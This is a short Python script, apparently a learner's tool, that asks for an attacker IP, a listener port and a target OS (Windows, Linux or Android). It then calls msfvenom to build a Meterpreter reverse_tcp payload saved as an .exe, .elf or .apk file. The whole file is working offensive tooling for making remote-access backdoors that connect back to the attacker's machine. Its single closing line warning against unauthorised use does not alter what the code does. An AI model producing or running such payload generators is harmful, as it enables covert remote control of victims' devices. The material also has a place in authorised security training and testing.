import subprocess
import os


# This code displays a banner when the program starts
def banner():
    print("""
    ------------------------------------------
    MSFVENOM PAYLOAD GENERATOR (Python)
    ------------------------------------------
    """)


# The code "def get_user_input()" Gets user input for the payload configuration
def get_user_input():
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (your listener port): ")
    print("Choose target OS:")
    print("1. Windows")   #In this code you get to chose between Windows, Linux, and Android
    print("2. Linux")
    print("3. Android")
    os_choice = input("Enter choice (1-3): ")

    # This code maps the choices for metasploit types
    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_tcp",
        "3": "android/meterpreter/reverse_tcp"
    }
#This code is for file extensions, where .exe refers to Windows, .elf refers to Linux, and .apk refers for Android
    extensions = {
        "1": ".exe",
        "2": ".elf",
        "3": ".apk"
    }

    # This validates the user input
    if os_choice not in payloads:
        print("Invalid choice. Exiting.")
        exit()

    return payloads[os_choice], extensions[os_choice], lhost, lport


#In here we generate the payload using msfvenom
def generate_payload(payload, extension, lhost, lport):
    filename = f"payload{extension}"
    print(f"\n[+] Generating payload: {filename}")

    #This builds the msfvenom command with all the parameters
    command = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}", # We put the local host IP Address
        f"LPORT={lport}",#The port number
        "-f", "raw",
        "-o", filename
    ]

    #This is used when executing the command to handle errors
    try:
        subprocess.run(command, check=True)
        print(f"[+] Payload saved as: {filename}")
    except subprocess.CalledProcessError:
        print("[-] Payload generation failed.")


#The main function that shows how the program will flow
def main():
    banner()
    payload, extension, lhost, lport = get_user_input()
    generate_payload(payload, extension, lhost, lport)


#This is an entry point that runs when the script is executed
if __name__ == "__main__":
    main()


#Please do not try to attemp this script on any device you do not own or authorized to.
